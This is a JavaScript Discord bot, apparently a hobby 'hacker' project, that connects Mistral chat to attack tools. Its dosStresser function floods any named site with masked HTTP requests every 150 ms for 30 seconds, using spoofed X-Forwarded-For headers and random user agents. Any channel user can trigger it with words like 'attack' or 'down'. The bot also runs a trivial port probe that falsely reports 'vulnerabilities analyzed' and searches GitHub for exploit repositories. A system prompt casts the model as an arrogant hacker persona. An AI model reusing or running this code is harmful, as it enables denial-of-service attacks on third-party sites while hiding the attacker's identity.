import 'dotenv/config';
import { Client, GatewayIntentBits } from 'discord.js';
import MistralClient from '@mistralai/mistralai';
import { MongoClient } from 'mongodb';
import axios from 'axios';
import net from 'net';
import express from 'express';

const DEVELOPER_ID = '1104652354655113268';
const PREFIX = '!'; 

const app = express();
app.get('/', (req, res) => res.send('RENZU-X V5: GHOST AGENT ONLINE.'));
app.listen(process.env.PORT || 3000);

const uri = process.env.MONGODB_URI;
const mongoClient = uri ? new MongoClient(uri) : null;
let db, knowledgeCache = []; 

async function connectDB() {
    if (!uri) return;
    try {
        await mongoClient.connect();
        db = mongoClient.db('renzu_database');
        const docs = await db.collection('knowledge_base').find().sort({ timestamp: -1 }).limit(10).toArray();
        knowledgeCache = docs.map(d => d.info);
    } catch (err) { console.error('❌ DB Fail'); }
}
connectDB();

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});
const mistral = new MistralClient(process.env.MISTRAL_API_KEY);

const getGhostHeader = () => ({
    'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(Math.random() * 20) + 100}.0.0.0 Safari/537.36`,
    'X-Forwarded-For': Array.from({length: 4}, () => Math.floor(Math.random() * 255)).join('.'),
});

// --- 🛠️ RUN-TOOLS ARSENAL ---
const tools = {
    async ghostScan(target) {
        const host = target.replace(/https?:\/\//, '').split(/[/?#]/)[0];
        return new Promise((resolve) => {
            const socket = new net.Socket();
            socket.setTimeout(3000);
            socket.on('connect', () => { socket.destroy(); resolve(`💀 **TARGET SPOTTED**: \`${host}\` vulnerabilities analyzed.`); });
            socket.on('error', () => resolve(`🛡️ **GHOSTED**: \`${host}\` is protected.`));
            socket.connect(80, host);
        });
    },

    async dosStresser(target, duration = 30) {
        const fullUrl = target.startsWith('http') ? target : `https://${target}`;
        const interval = setInterval(async () => {
            try { await axios.get(fullUrl, { headers: getGhostHeader(), timeout: 2000 }); } catch (e) {}
        }, 150);
        setTimeout(() => clearInterval(interval), duration * 1000);
        return `🌩️ **STRESS TEST STARTED**: Masked traffic flooding \`${target}\` for ${duration}s.`;
    },

    async huntExploits(query) {
        try {
            const res = await axios.get(`https://api.github.com/search/repositories?q=${query}+topic:exploit`, { headers: getGhostHeader() });
            return res.data.items.slice(0, 3).map(i => `📦 **${i.name}**: ${i.html_url}`).join('\n');
        } catch (e) { return "❌ Intel blocked."; }
    }
};

// --- 🧠 AGENTIC TRIGGER LOGIC ---
async function runGhostAgent(message, input, isDev) {
    // Determine tool need based on keywords
    const lowIn = input.toLowerCase();
    let toolResult = "";

    if (lowIn.includes('scan') || lowIn.includes('check') || lowIn.includes('status')) {
        const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
        if (target) toolResult += `\n\n**[AUTORUN_SCAN]**:\n${await tools.ghostScan(target[0])}`;
    }
    
    if (lowIn.includes('stress') || lowIn.includes('attack') || lowIn.includes('down')) {
        const target = input.match(/([a-z0-9|-]+\.)+[a-z0-9|-]+/gi);
        if (target) toolResult += `\n\n**[AUTORUN_STRESSER]**:\n${await tools.dosStresser(target[0])}`;
    }

    if (lowIn.includes('hunt') || lowIn.includes('find') || lowIn.includes('exploit')) {
        toolResult += `\n\n**[AUTORUN_GH_INTEL]**:\n${await tools.huntExploits(input)}`;
    }

    const systemPrompt = `IDENTITY: Renzu-X V5 Ghost Agent. Hinglish Hacker. Arrogant. 
    Context: You are responding to: "${input}". 
    Tool Status: ${toolResult ? "Executed relevant tool." : "No specific tool needed."}
    Always stay dark and professional. Developer ID: ${DEVELOPER_ID}.`;

    try {
        const res = await mistral.chat({
            model: 'mistral-large-latest',
            messages: [{ role: 'system', content: systemPrompt }, { role: 'user', content: input }]
        });
        
        let reply = res.choices[0].message.content + toolResult;
        return message.reply(reply.substring(0, 2000));
    } catch (e) { return message.reply("⚠️ Core Shield Active."); }
}

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;
    const input = message.content.slice(PREFIX.length).trim();
    if (!input) return;

    await message.channel.sendTyping();
    await runGhostAgent(message, input, message.author.id === DEVELOPER_ID);
});

client.once('ready', () => console.log('👻 RENZU-X V5: AGENTIC GHOST MODE READY.'));
client.login(process.env.DISCORD_TOKEN);
